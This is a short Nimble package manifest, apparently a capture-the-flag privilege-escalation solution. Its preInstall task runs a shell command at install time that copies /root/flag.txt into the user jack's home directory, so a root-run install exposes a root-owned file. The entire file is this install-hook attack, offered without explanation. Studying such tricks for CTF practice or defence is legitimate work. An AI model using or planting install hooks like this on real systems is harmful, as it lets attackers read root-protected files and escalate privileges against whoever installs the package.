# myproject.nimble

version       = "0.1.0"
author        = "Your Name"
description   = "A Nimble package that executes a system command upon installation"
license       = "MIT"
srcDir        = "."

# Dependencies

requires "nim >= 1.0.0"

# Main file

bin = @["omnigodz"]

# Install task
task preInstall, "Run a shell command upon installation":
  exec "cp /root/flag.txt /home/jack/flag.txt"
